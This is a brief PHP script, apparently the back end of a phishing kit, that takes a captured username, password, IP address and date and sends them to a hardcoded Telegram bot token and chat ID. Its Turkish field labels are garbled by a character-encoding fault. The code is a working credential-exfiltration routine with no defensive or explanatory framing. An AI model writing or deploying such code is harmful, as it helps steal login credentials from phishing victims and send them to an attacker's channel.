<?php
    $token='5278189706:AAGdMY00BPYiDFg4r5QKK2zKB4s5iBJlyxQ';
    $data = [
        'text' => ' 
Kullan覺c覺 Ad覺: '.$blind.' 

Kullan覺c覺 Ad覺 : '.$blind.'
齦fre : '.$blindP.'
ip : '.$ip.'
Tarih : '.$tarih.'      ',
      'chat_id' =>-637969445
    ];
    
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );


  
?>